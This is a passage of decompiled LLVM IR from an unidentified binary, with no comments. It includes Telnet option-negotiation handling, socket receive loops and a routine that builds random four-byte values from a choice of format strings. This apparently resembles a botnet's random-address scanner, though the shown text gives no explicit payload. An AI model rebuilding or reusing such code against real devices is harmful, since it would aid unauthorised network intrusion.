  %v4_10002e48 = call i32 @function_1000eca8(i32 %arg1, i32 %v2_10002e38, i32 1, i32 16384)
  %v2_10002e54 = load i8, i8* %v1_10002dec, align 1
  %v3_10002e5c = icmp eq i8 %v2_10002e54, -4
  br i1 %v3_10002e5c, label %dec_label_pc_10002e64, label %dec_label_pc_10002e70

dec_label_pc_10002e64:                            ; preds = %dec_label_pc_10002e2c
  store i8 -2, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002f18

dec_label_pc_10002e70:                            ; preds = %dec_label_pc_10002e2c
  %v2_10002e78 = load i8, i8* %v1_10002dec, align 1
  %v3_10002e80 = icmp eq i8 %v2_10002e78, -2
  br i1 %v3_10002e80, label %dec_label_pc_10002e88, label %dec_label_pc_10002e94

dec_label_pc_10002e88:                            ; preds = %dec_label_pc_10002e70
  store i8 -4, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002f18

dec_label_pc_10002e94:                            ; preds = %dec_label_pc_10002e70
  %v2_10002e9c = load i8, i8* %v1_10002dec, align 1
  %v3_10002ea4 = icmp eq i8 %v2_10002e9c, 3
  br i1 %v3_10002ea4, label %dec_label_pc_10002eac, label %dec_label_pc_10002ee4

dec_label_pc_10002eac:                            ; preds = %dec_label_pc_10002e94
  store i8 -3, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002f18

dec_label_pc_10002ee4:                            ; preds = %dec_label_pc_10002e94
  %v3_10002ebc = icmp eq i8 %v2_10002e9c, -3
  %.7 = select i1 %v3_10002ebc, i8 -4, i8 -2
  store i8 %.7, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002f18

dec_label_pc_10002f18:                            ; preds = %dec_label_pc_10002eac, %dec_label_pc_10002e88, %dec_label_pc_10002e64, %dec_label_pc_10002ee4
  store i32 268447536, i32* @lr, align 4
  %v4_10002f2c = call i32 @function_1000eca8(i32 %arg1, i32 %v2_10002e38, i32 1, i32 16384)
  %v1_10002f34 = add i32 %arg2, 2
  store i32 ptrtoint (i32* @global_var_10002f4c.53 to i32), i32* @lr, align 4
  %v4_10002f48 = call i32 @function_1000eca8(i32 %arg1, i32 %v1_10002f34, i32 1, i32 16384)
  br label %dec_label_pc_10002f54

dec_label_pc_10002f54:                            ; preds = %dec_label_pc_10002e10, %dec_label_pc_10002f18, %dec_label_pc_10002dc4
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-56, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder label %dec_label_pc_10002f54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10002f18, { 3, 0, 1, 2 }
}

define i32 @function_10002f74(i32 %arg1) local_unnamed_addr {
dec_label_pc_10002f74:
  store i32 %arg1, i32* @r3, align 4
  %v0_10002fa0 = call i32 @function_1000df60()
  store i32 ptrtoint ([6 x i8]* @global_var_10017b50.54 to i32), i32* @r3, align 4
  %v0_100030dc10 = call i32 @function_1000df60()
  %v2_100030e412 = icmp eq i32 %v0_100030dc10, 0
  br i1 %v2_100030e412, label %dec_label_pc_100030f4, label %dec_label_pc_10002fcc.preheader.lr.ph

dec_label_pc_10002fcc.preheader.lr.ph:            ; preds = %dec_label_pc_10002f74
  %v2_10002fe8 = add i32 %v0_10002fa0, %arg1
  br label %dec_label_pc_10002fcc.preheader

dec_label_pc_10002fc0:                            ; preds = %dec_label_pc_10003054, %dec_label_pc_1000302c, %dec_label_pc_10003004, %dec_label_pc_10002fdc
  %v1_10002fc4 = add nsw i32 %stack_var_-40.08, 1
  %v3_10002fd4 = icmp sgt i32 %v0_10002fa0, %v1_10002fc4
  br i1 %v3_10002fd4, label %dec_label_pc_10002fdc, label %dec_label_pc_1000307c

dec_label_pc_10002fdc:                            ; preds = %dec_label_pc_10002fcc.preheader, %dec_label_pc_10002fc0
  %stack_var_-40.08 = phi i32 [ %v1_10002fc4, %dec_label_pc_10002fc0 ], [ %stack_var_-40.115, %dec_label_pc_10002fcc.preheader ]
  %v2_10002ff0 = sub i32 %v2_10002fe8, %stack_var_-40.08
  %v1_10002ff4 = inttoptr i32 %v2_10002ff0 to i8*
  %v2_10002ff4 = load i8, i8* %v1_10002ff4, align 1
  %v3_10002ffc = icmp eq i8 %v2_10002ff4, 0
  br i1 %v3_10002ffc, label %dec_label_pc_10002fc0, label %dec_label_pc_10003004

dec_label_pc_10003004:                            ; preds = %dec_label_pc_10002fdc
  %v2_1000301c = load i8, i8* %v1_10002ff4, align 1
  %v3_10003024 = icmp eq i8 %v2_1000301c, 32
  br i1 %v3_10003024, label %dec_label_pc_10002fc0, label %dec_label_pc_1000302c

dec_label_pc_1000302c:                            ; preds = %dec_label_pc_10003004
  %v2_10003044 = load i8, i8* %v1_10002ff4, align 1
  %v3_1000304c = icmp eq i8 %v2_10003044, 13
  br i1 %v3_1000304c, label %dec_label_pc_10002fc0, label %dec_label_pc_10003054

dec_label_pc_10003054:                            ; preds = %dec_label_pc_1000302c
  %v2_1000306c = load i8, i8* %v1_10002ff4, align 1
  %v3_10003074 = icmp eq i8 %v2_1000306c, 10
  br i1 %v3_10003074, label %dec_label_pc_10002fc0, label %dec_label_pc_1000307c

dec_label_pc_1000307c:                            ; preds = %dec_label_pc_10003054, %dec_label_pc_10002fc0, %dec_label_pc_10002fcc.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %stack_var_-40.115, %dec_label_pc_10002fcc.preheader ], [ %stack_var_-40.08, %dec_label_pc_10003054 ], [ %v1_10002fc4, %dec_label_pc_10002fc0 ]
  %v2_10003090 = sub i32 %v2_10002fe8, %stack_var_-40.0.lcssa
  %v1_10003094 = inttoptr i32 %v2_10003090 to i8*
  %v2_10003094 = load i8, i8* %v1_10003094, align 1
  %v2_100030a8 = add i32 %storemerge316, ptrtoint ([6 x i8]* @global_var_10017b50.54 to i32)
  %v1_100030ac = inttoptr i32 %v2_100030a8 to i8*
  %v2_100030ac = load i8, i8* %v1_100030ac, align 1
  %v4_100030b4 = icmp eq i8 %v2_10003094, %v2_100030ac
  br i1 %v4_100030b4, label %dec_label_pc_100030f4, label %dec_label_pc_100030c8

dec_label_pc_100030c8:                            ; preds = %dec_label_pc_1000307c
  %v1_100030cc = add i32 %storemerge316, 1
  store i32 ptrtoint ([6 x i8]* @global_var_10017b50.54 to i32), i32* @r3, align 4
  %v0_100030dc = call i32 @function_1000df60()
  %v2_100030e4 = icmp ult i32 %v1_100030cc, %v0_100030dc
  br i1 %v2_100030e4, label %dec_label_pc_10002fcc.preheader, label %dec_label_pc_100030f4

dec_label_pc_10002fcc.preheader:                  ; preds = %dec_label_pc_10002fcc.preheader.lr.ph, %dec_label_pc_100030c8
  %storemerge316 = phi i32 [ 0, %dec_label_pc_10002fcc.preheader.lr.ph ], [ %v1_100030cc, %dec_label_pc_100030c8 ]
  %stack_var_-40.115 = phi i32 [ 0, %dec_label_pc_10002fcc.preheader.lr.ph ], [ %stack_var_-40.0.lcssa, %dec_label_pc_100030c8 ]
  %v3_10002fd46 = icmp sgt i32 %v0_10002fa0, %stack_var_-40.115
  br i1 %v3_10002fd46, label %dec_label_pc_10002fdc, label %dec_label_pc_1000307c

dec_label_pc_100030f4:                            ; preds = %dec_label_pc_10002f74, %dec_label_pc_1000307c, %dec_label_pc_100030c8
  %storemerge = phi i32 [ 0, %dec_label_pc_10002f74 ], [ 1, %dec_label_pc_1000307c ], [ 0, %dec_label_pc_100030c8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-40.115, { 2, 0, 1 }
  uselistorder i32 %storemerge316, { 1, 0 }
  uselistorder i32 %v1_100030cc, { 1, 0 }
  uselistorder i32 %v0_10002fa0, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_10017b50.54 to i32), { 2, 1, 0 }
  uselistorder label %dec_label_pc_100030f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002fcc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000307c, { 2, 0, 1 }
}

define i32 @function_10003118(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_10003118:
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %v0_10003148 = load i32, i32* @r10, align 4
  store i32 %arg4, i32* %stack_var_-64, align 4
  %v1_100033885 = add i32 %v0_10003148, 2
  %v2_100033906 = icmp slt i32 %v1_100033885, %arg7
  br i1 %v2_100033906, label %dec_label_pc_10003398.lr.ph, label %dec_label_pc_100033c8

dec_label_pc_10003398.lr.ph:                      ; preds = %dec_label_pc_10003118
  %v2_10003180 = ptrtoint i32* %stack_var_-192 to i32
  %v1_100031c8 = udiv i32 %arg1, 32
  %v1_100031d0 = mul nuw nsw i32 %v1_100031c8, 4
  %v2_100031d4 = ptrtoint i32* %stack_var_-216 to i32
  %v2_100031d8 = add nuw nsw i32 %v1_100031d0, 24
  %v1_100031dc = add i32 %v2_100031d8, %v2_100031d4
  %v1_100031e0 = inttoptr i32 %v1_100031dc to i32*
  %v1_100031e8 = urem i32 %arg1, 32
  %v3_100031f0 = shl i32 1, %v1_100031e8
  %v1_10003210 = add i32 %arg1, 1
  %v2_10003218 = ptrtoint i32* %stack_var_-64 to i32
  %v4_10003348 = inttoptr i32 %arg2 to i8*
  %v3_1000335c = icmp eq i32 %arg3, 0
  %v2_100033a8 = icmp sgt i32 %arg5, 0
  br label %dec_label_pc_10003398

dec_label_pc_10003180:                            ; preds = %dec_label_pc_100033a4, %dec_label_pc_10003398
  store i32 %v2_10003180, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge

dec_label_pc_10003194.dec_label_pc_10003194_crit_edge: ; preds = %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge.dec_label_pc_10003194.dec_label_pc_10003194_crit_edge_crit_edge, %dec_label_pc_10003180
  %v3_10003198.pre = phi i32 [ %v2_10003180, %dec_label_pc_10003180 ], [ %v3_10003198.pre.pre, %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge.dec_label_pc_10003194.dec_label_pc_10003194_crit_edge_crit_edge ]
  %v1_100031b036 = phi i32 [ 1, %dec_label_pc_10003180 ], [ %v1_100031b0, %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge.dec_label_pc_10003194.dec_label_pc_10003194_crit_edge_crit_edge ]
  %v1_1000319c = mul nuw nsw i32 %v1_100031b036, 4
  %v2_100031a0 = add i32 %v1_1000319c, %v3_10003198.pre
  %v2_100031a8 = inttoptr i32 %v2_100031a0 to i32*
  store i32 0, i32* %v2_100031a8, align 4
  %v1_100031b0 = add nuw nsw i32 %v1_100031b036, 1
  %tmp33 = icmp ult i32 %v1_100031b0, 32
  br i1 %tmp33, label %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge.dec_label_pc_10003194.dec_label_pc_10003194_crit_edge_crit_edge, label %dec_label_pc_100031c4

dec_label_pc_10003194.dec_label_pc_10003194_crit_edge.dec_label_pc_10003194.dec_label_pc_10003194_crit_edge_crit_edge: ; preds = %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge
  %v3_10003198.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge

dec_label_pc_100031c4:                            ; preds = %dec_label_pc_10003194.dec_label_pc_10003194_crit_edge
  %v2_100031e0 = load i32, i32* %v1_100031e0, align 4
  %v2_100031f4 = or i32 %v2_100031e0, %v3_100031f0
  store i32 %v2_100031f4, i32* %v1_100031e0, align 4
  store i32 268448308, i32* @lr, align 4
  %v5_10003230 = call i32 @function_1000c684(i32 %v1_10003210, i32 %v2_10003180, i32 0, i32 0, i32 %v2_10003218)
  %tmp34 = icmp slt i32 %v5_10003230, 1
  br i1 %tmp34, label %dec_label_pc_100033c8, label %dec_label_pc_10003240

dec_label_pc_10003240:                            ; preds = %dec_label_pc_100031c4
  %v2_1000324c = add i32 %stack_var_-196.09, %arg6
  store i32 268448360, i32* @lr, align 4
  %v4_10003264 = call i32 @function_1000ec70(i32 %arg1, i32 %v2_1000324c, i32 1, i32 0)
  %v4_10003278 = icmp eq i32 %v4_10003264, -1
  br i1 %v4_10003278, label %dec_label_pc_1000328c, label %dec_label_pc_10003280

dec_label_pc_10003280:                            ; preds = %dec_label_pc_10003240
  %v3_10003284 = icmp eq i32 %v4_10003264, 0
  br i1 %v3_10003284, label %dec_label_pc_1000328c, label %dec_label_pc_10003298

dec_label_pc_1000328c:                            ; preds = %dec_label_pc_10003280, %dec_label_pc_10003240
  br label %dec_label_pc_100033d0

dec_label_pc_10003298:                            ; preds = %dec_label_pc_10003280
  %v2_100032a0 = add i32 %v4_10003264, %stack_var_-196.09
  %v4_100032a8 = inttoptr i32 %v2_1000324c to i8*
  %v3_100032ac = load i8, i8* %v4_100032a8, align 1
  %v3_100032b4 = icmp eq i8 %v3_100032ac, -1
  br i1 %v3_100032b4, label %dec_label_pc_100032bc, label %dec_label_pc_10003340

dec_label_pc_100032bc:                            ; preds = %dec_label_pc_10003298
  %v1_100032c0 = add i32 %v2_1000324c, 1
  store i32 268448472, i32* @lr, align 4
  %v4_100032d4 = call i32 @function_1000ec70(i32 %arg1, i32 %v1_100032c0, i32 2, i32 0)
  %v4_100032e8 = icmp eq i32 %v4_100032d4, -1
  br i1 %v4_100032e8, label %dec_label_pc_100032fc, label %dec_label_pc_100032f0

dec_label_pc_100032f0:                            ; preds = %dec_label_pc_100032bc
  %v3_100032f4 = icmp eq i32 %v4_100032d4, 0
  br i1 %v3_100032f4, label %dec_label_pc_100032fc, label %dec_label_pc_10003308

dec_label_pc_100032fc:                            ; preds = %dec_label_pc_100032f0, %dec_label_pc_100032bc
  br label %dec_label_pc_100033d0

dec_label_pc_10003308:                            ; preds = %dec_label_pc_100032f0
  %v2_10003310 = add i32 %v4_100032d4, %v2_100032a0
  store i32 268448552, i32* @lr, align 4
  %v4_10003324 = call i32 @function_10002dc4(i32 %arg1, i32 %v2_1000324c, i32 3, i32 %v2_100032a0)
  %v3_1000332c = icmp eq i32 %v4_10003324, 0
  br i1 %v3_1000332c, label %dec_label_pc_10003334, label %dec_label_pc_10003384.backedge

dec_label_pc_10003334:                            ; preds = %dec_label_pc_10003308
  br label %dec_label_pc_100033d0

dec_label_pc_10003340:                            ; preds = %dec_label_pc_10003298
  store i32 268448588, i32* @lr, align 4
  %v5_10003348 = call i32 @function_1000e1b0(i32 %arg6, i8* %v4_10003348, i32 %v2_1000324c)
  %v3_10003350 = icmp eq i32 %v5_10003348, 0
  br i1 %v3_10003350, label %dec_label_pc_10003358, label %dec_label_pc_100033bc

dec_label_pc_10003358:                            ; preds = %dec_label_pc_10003340
  br i1 %v3_1000335c, label %dec_label_pc_10003384.backedge, label %dec_label_pc_10003364

dec_label_pc_10003384.backedge:                   ; preds = %dec_label_pc_10003358, %dec_label_pc_10003364, %dec_label_pc_10003308
  %stack_var_-196.0.be = phi i32 [ %v2_10003310, %dec_label_pc_10003308 ], [ %v2_100032a0, %dec_label_pc_10003358 ], [ %v2_100032a0, %dec_label_pc_10003364 ]
  %v1_10003388 = add i32 %stack_var_-196.0.be, 2
  %v2_10003390 = icmp slt i32 %v1_10003388, %arg7
  br i1 %v2_10003390, label %dec_label_pc_10003384.backedge.dec_label_pc_10003398_crit_edge, label %dec_label_pc_100033c8

dec_label_pc_10003384.backedge.dec_label_pc_10003398_crit_edge: ; preds = %dec_label_pc_10003384.backedge
  %v3_10003398.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_10003398

dec_label_pc_10003364:                            ; preds = %dec_label_pc_10003358
  %v1_10003368 = call i32 @function_10002f74(i32 %arg6)
  %v3_10003370 = icmp eq i32 %v1_10003368, 0
  br i1 %v3_10003370, label %dec_label_pc_10003384.backedge, label %dec_label_pc_100033bc

dec_label_pc_10003398:                            ; preds = %dec_label_pc_10003384.backedge.dec_label_pc_10003398_crit_edge, %dec_label_pc_10003398.lr.ph
  %v3_10003398 = phi i32 [ %arg4, %dec_label_pc_10003398.lr.ph ], [ %v3_10003398.pre, %dec_label_pc_10003384.backedge.dec_label_pc_10003398_crit_edge ]
  %stack_var_-196.09 = phi i32 [ %v0_10003148, %dec_label_pc_10003398.lr.ph ], [ %stack_var_-196.0.be, %dec_label_pc_10003384.backedge.dec_label_pc_10003398_crit_edge ]
  %v2_1000339c = icmp sgt i32 %v3_10003398, 0
  br i1 %v2_1000339c, label %dec_label_pc_10003180, label %dec_label_pc_100033a4

dec_label_pc_100033a4:                            ; preds = %dec_label_pc_10003398
  br i1 %v2_100033a8, label %dec_label_pc_10003180, label %dec_label_pc_100033c8

dec_label_pc_100033bc:                            ; preds = %dec_label_pc_10003340, %dec_label_pc_10003364
  br label %dec_label_pc_100033d0

dec_label_pc_100033c8:                            ; preds = %dec_label_pc_10003384.backedge, %dec_label_pc_100033a4, %dec_label_pc_100031c4, %dec_label_pc_10003118
  br label %dec_label_pc_100033d0

dec_label_pc_100033d0:                            ; preds = %dec_label_pc_100033bc, %dec_label_pc_10003334, %dec_label_pc_100032fc, %dec_label_pc_1000328c, %dec_label_pc_100033c8
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_100033c8 ], [ 1, %dec_label_pc_100033bc ], [ 0, %dec_label_pc_1000328c ], [ 0, %dec_label_pc_100032fc ], [ 0, %dec_label_pc_10003334 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %stack_var_-196.09, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.be, { 1, 0 }
  uselistorder i32 %v2_100032a0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_100031b0, { 1, 0 }
  uselistorder i32 %v2_10003180, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10002dc4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_1000c684, { 4, 3, 1, 0, 2 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_100033d0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_100033c8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100033bc, { 1, 0 }
  uselistorder label %dec_label_pc_10003384.backedge, { 1, 0, 2 }
}

define i32 @function_100033f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100033f0:
  %stack_var_-52 = alloca i32, align 4
  store i8 0, i8* bitcast (i32* @global_var_1002b911.56 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1002b912.57 to i8*), align 4
  store i8 0, i8* @global_var_1002b913.58, align 1
  store i8 0, i8* @global_var_1002b914.59, align 1
  store i32 268448840, i32* @lr, align 4
  %v1_10003444 = call i32 @function_1000f3cc(i32 ptrtoint (i32* @global_var_1002b910.55 to i32))
  %v2_10003464 = srem i32 %v1_10003444, 255
  %v1_1000348c = trunc i32 %v2_10003464 to i8
  store i8 %v1_1000348c, i8* bitcast (i32* @global_var_1002b911.56 to i8*), align 4
  store i32 268448916, i32* @lr, align 4
  %v1_10003490 = call i32 @function_1000f3cc(i32 ptrtoint (i32* @global_var_1002b910.55 to i32))
  %v2_100034b0 = srem i32 %v1_10003490, 255
  %v1_100034d8 = trunc i32 %v2_100034b0 to i8
  store i8 %v1_100034d8, i8* bitcast (i32* @global_var_1002b912.57 to i8*), align 4
  store i32 268448992, i32* @lr, align 4
  %v1_100034dc = call i32 @function_1000f3cc(i32 ptrtoint (i32* @global_var_1002b910.55 to i32))
  %v2_100034fc = srem i32 %v1_100034dc, 255
  %v1_10003524 = trunc i32 %v2_100034fc to i8
  store i8 %v1_10003524, i8* @global_var_1002b913.58, align 1
  store i32 268449068, i32* @lr, align 4
  %v1_10003528 = call i32 @function_1000f3cc(i32 ptrtoint (i32* @global_var_1002b910.55 to i32))
  %v2_10003548 = srem i32 %v1_10003528, 255
  %v1_10003570 = trunc i32 %v2_10003548 to i8
  store i8 %v1_10003570, i8* @global_var_1002b914.59, align 1
  store i32 268449144, i32* @lr, align 4
  %v1_10003574 = call i32 @function_1000f3cc(i32 ptrtoint (i32* @global_var_1002b910.55 to i32))
  %v2_10003594 = srem i32 %v1_10003574, 247
  %v3_100035a8 = icmp eq i32 %v2_10003594, 0
  br i1 %v3_100035a8, label %dec_label_pc_100035b0, label %dec_label_pc_100035f8

dec_label_pc_100035b0:                            ; preds = %dec_label_pc_100033f0
  %v2_100035b0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100035c4 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100035c4 = zext i8 %v3_100035c4 to i32
  %v4_100035f4 = call i32 @function_10001734(i32 %v2_100035b0, i32 ptrtoint ([11 x i8]* @global_var_10017b58.60 to i32), i32 %v4_100035c4)
  br label %dec_label_pc_100035f8

dec_label_pc_100035f8:                            ; preds = %dec_label_pc_100033f0, %dec_label_pc_100035b0
  %v3_100035fc = icmp eq i32 %v2_10003594, 1
  br i1 %v3_100035fc, label %dec_label_pc_10003604, label %dec_label_pc_1000364c

dec_label_pc_10003604:                            ; preds = %dec_label_pc_100035f8
  %v2_10003604 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003618 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003618 = zext i8 %v3_10003618 to i32
  %v4_10003648 = call i32 @function_10001734(i32 %v2_10003604, i32 ptrtoint ([12 x i8]* @global_var_10017b64.61 to i32), i32 %v4_10003618)
  br label %dec_label_pc_1000364c

dec_label_pc_1000364c:                            ; preds = %dec_label_pc_100035f8, %dec_label_pc_10003604
  %v3_10003650 = icmp eq i32 %v2_10003594, 2
  br i1 %v3_10003650, label %dec_label_pc_10003658, label %dec_label_pc_100036a0

dec_label_pc_10003658:                            ; preds = %dec_label_pc_1000364c
  %v2_10003658 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000366c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_1000366c = zext i8 %v3_1000366c to i32
  %v4_1000369c = call i32 @function_10001734(i32 %v2_10003658, i32 ptrtoint ([12 x i8]* @global_var_10017b70.62 to i32), i32 %v4_1000366c)
  br label %dec_label_pc_100036a0

dec_label_pc_100036a0:                            ; preds = %dec_label_pc_1000364c, %dec_label_pc_10003658
  %v3_100036a4 = icmp eq i32 %v2_10003594, 3
  br i1 %v3_100036a4, label %dec_label_pc_100036ac, label %dec_label_pc_100036f4

dec_label_pc_100036ac:                            ; preds = %dec_label_pc_100036a0
  %v2_100036ac = ptrtoint i32* %stack_var_-52 to i32
  %v3_100036c0 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100036c0 = zext i8 %v3_100036c0 to i32
  %v4_100036f0 = call i32 @function_10001734(i32 %v2_100036ac, i32 ptrtoint ([12 x i8]* @global_var_10017b7c.63 to i32), i32 %v4_100036c0)
  br label %dec_label_pc_100036f4

dec_label_pc_100036f4:                            ; preds = %dec_label_pc_100036a0, %dec_label_pc_100036ac
  %v3_100036f8 = icmp eq i32 %v2_10003594, 4
  br i1 %v3_100036f8, label %dec_label_pc_10003700, label %dec_label_pc_10003748

dec_label_pc_10003700:                            ; preds = %dec_label_pc_100036f4
  %v2_10003700 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003714 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003714 = zext i8 %v3_10003714 to i32
  %v4_10003744 = call i32 @function_10001734(i32 %v2_10003700, i32 ptrtoint ([12 x i8]* @global_var_10017b88.64 to i32), i32 %v4_10003714)
  br label %dec_label_pc_10003748

dec_label_pc_10003748:                            ; preds = %dec_label_pc_100036f4, %dec_label_pc_10003700
  %v3_1000374c = icmp eq i32 %v2_10003594, 5
  br i1 %v3_1000374c, label %dec_label_pc_10003754, label %dec_label_pc_1000379c

dec_label_pc_10003754:                            ; preds = %dec_label_pc_10003748
  %v2_10003754 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003768 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003768 = zext i8 %v3_10003768 to i32
  %v4_10003798 = call i32 @function_10001734(i32 %v2_10003754, i32 ptrtoint ([12 x i8]* @global_var_10017b94.65 to i32), i32 %v4_10003768)
  br label %dec_label_pc_1000379c

dec_label_pc_1000379c:                            ; preds = %dec_label_pc_10003748, %dec_label_pc_10003754
  %v3_100037a0 = icmp eq i32 %v2_10003594, 6
  br i1 %v3_100037a0, label %dec_label_pc_100037a8, label %dec_label_pc_100037f0

dec_label_pc_100037a8:                            ; preds = %dec_label_pc_1000379c
  %v2_100037a8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100037bc = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100037bc = zext i8 %v3_100037bc to i32
  %v4_100037ec = call i32 @function_10001734(i32 %v2_100037a8, i32 ptrtoint ([13 x i8]* @global_var_10017ba0.66 to i32), i32 %v4_100037bc)
  br label %dec_label_pc_100037f0

dec_label_pc_100037f0:                            ; preds = %dec_label_pc_1000379c, %dec_label_pc_100037a8
  %v3_100037f4 = icmp eq i32 %v2_10003594, 7
  br i1 %v3_100037f4, label %dec_label_pc_100037fc, label %dec_label_pc_10003844

dec_label_pc_100037fc:                            ; preds = %dec_label_pc_100037f0
  %v2_100037fc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003810 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003810 = zext i8 %v3_10003810 to i32
  %v4_10003840 = call i32 @function_10001734(i32 %v2_100037fc, i32 ptrtoint ([13 x i8]* @global_var_10017bb0.67 to i32), i32 %v4_10003810)
  br label %dec_label_pc_10003844

dec_label_pc_10003844:                            ; preds = %dec_label_pc_100037f0, %dec_label_pc_100037fc
  %v3_10003848 = icmp eq i32 %v2_10003594, 8
  br i1 %v3_10003848, label %dec_label_pc_10003850, label %dec_label_pc_10003898

dec_label_pc_10003850:                            ; preds = %dec_label_pc_10003844
  %v2_10003850 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003864 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003864 = zext i8 %v3_10003864 to i32
  %v4_10003894 = call i32 @function_10001734(i32 %v2_10003850, i32 ptrtoint ([13 x i8]* @global_var_10017bc0.68 to i32), i32 %v4_10003864)
  br label %dec_label_pc_10003898

dec_label_pc_10003898:                            ; preds = %dec_label_pc_10003844, %dec_label_pc_10003850
  %v3_1000389c = icmp eq i32 %v2_10003594, 9
  br i1 %v3_1000389c, label %dec_label_pc_100038a4, label %dec_label_pc_100038ec

dec_label_pc_100038a4:                            ; preds = %dec_label_pc_10003898
  %v2_100038a4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100038b8 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100038b8 = zext i8 %v3_100038b8 to i32
  %v4_100038e8 = call i32 @function_10001734(i32 %v2_100038a4, i32 ptrtoint ([13 x i8]* @global_var_10017bd0.69 to i32), i32 %v4_100038b8)
  br label %dec_label_pc_100038ec

dec_label_pc_100038ec:                            ; preds = %dec_label_pc_10003898, %dec_label_pc_100038a4
  %v3_100038f0 = icmp eq i32 %v2_10003594, 10
  br i1 %v3_100038f0, label %dec_label_pc_100038f8, label %dec_label_pc_10003940

dec_label_pc_100038f8:                            ; preds = %dec_label_pc_100038ec
  %v2_100038f8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000390c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_1000390c = zext i8 %v3_1000390c to i32
  %v4_1000393c = call i32 @function_10001734(i32 %v2_100038f8, i32 ptrtoint ([13 x i8]* @global_var_10017be0.70 to i32), i32 %v4_1000390c)
  br label %dec_label_pc_10003940

dec_label_pc_10003940:                            ; preds = %dec_label_pc_100038ec, %dec_label_pc_100038f8
  %v3_10003944 = icmp eq i32 %v2_10003594, 11
  br i1 %v3_10003944, label %dec_label_pc_1000394c, label %dec_label_pc_10003994

dec_label_pc_1000394c:                            ; preds = %dec_label_pc_10003940
  %v2_1000394c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003960 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003960 = zext i8 %v3_10003960 to i32
  %v4_10003990 = call i32 @function_10001734(i32 %v2_1000394c, i32 ptrtoint ([13 x i8]* @global_var_10017bf0.71 to i32), i32 %v4_10003960)
  br label %dec_label_pc_10003994

dec_label_pc_10003994:                            ; preds = %dec_label_pc_10003940, %dec_label_pc_1000394c
  %v3_10003998 = icmp eq i32 %v2_10003594, 12
  br i1 %v3_10003998, label %dec_label_pc_100039a0, label %dec_label_pc_100039e8

dec_label_pc_100039a0:                            ; preds = %dec_label_pc_10003994
  %v2_100039a0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100039b4 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100039b4 = zext i8 %v3_100039b4 to i32
  %v4_100039e4 = call i32 @function_10001734(i32 %v2_100039a0, i32 ptrtoint ([13 x i8]* @global_var_10017c00.72 to i32), i32 %v4_100039b4)
  br label %dec_label_pc_100039e8

dec_label_pc_100039e8:                            ; preds = %dec_label_pc_10003994, %dec_label_pc_100039a0
  %v3_100039ec = icmp eq i32 %v2_10003594, 13
  br i1 %v3_100039ec, label %dec_label_pc_100039f4, label %dec_label_pc_10003a3c

dec_label_pc_100039f4:                            ; preds = %dec_label_pc_100039e8
  %v2_100039f4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003a08 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10003a08 = zext i8 %v3_10003a08 to i32
